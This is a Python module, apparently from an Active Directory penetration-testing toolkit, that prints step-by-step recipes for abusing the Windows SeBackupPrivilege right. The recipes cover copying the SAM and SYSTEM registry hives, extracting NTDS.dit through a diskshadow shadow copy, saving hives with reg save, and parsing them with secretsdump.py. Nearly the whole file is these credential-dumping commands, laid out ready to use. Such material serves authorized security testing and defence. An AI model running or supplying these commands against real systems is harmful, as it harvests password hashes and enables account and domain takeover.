"""SeBackupPrivilege abuse — read any file, extract SAM/SYSTEM, DCSync."""
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.privesc.sebackup_abuse.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["file_read", "registry_read"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1003.002"],
}


def run(args: Any) -> int:
    target = getattr(args, "target", None)
    action = getattr(args, "backup_action", "info")

    if action == "info":
        print("[*] SeBackupPrivilege abuse paths:")
        print()
        print("  1. Copy SAM/SYSTEM via robocopy:")
        print("     robocopy /b C:\\Windows\\System32\\Config . SAM SYSTEM")
        print()
        print("  2. Extract NTDS.dit via diskshadow:")
        print('     set context persistent nowriters')
        print('     add volume C: alias cdrive')
        print('     create')
        print('     expose %cdrive% E:')
        print('     robocopy /b E:\\Windows\\NTDS . ntds.dit')
        print()
        print("  3. Registry save:")
        print("     reg save HKLM\\SAM sam.save")
        print("     reg save HKLM\\SYSTEM system.save")
        print()
        print("  4. Parse locally:")
        print("     secretsdump.py -sam sam.save -system system.save LOCAL")
        return 0

    if action == "ntds":
        print("[*] Extracting NTDS.dit via diskshadow + SeBackupPrivilege...")
        script = [
            'set context persistent nowriters',
            'set metadata C:\\Windows\\Temp\\meta.cab',
            'add volume C: alias cdrive',
            'create',
            'expose %cdrive% Z:',
        ]
        print("[*] Diskshadow script:")
        for line in script:
            print(f"  {line}")
        print("\n  Then: robocopy /b Z:\\Windows\\NTDS . ntds.dit")
        return 0

    return 0
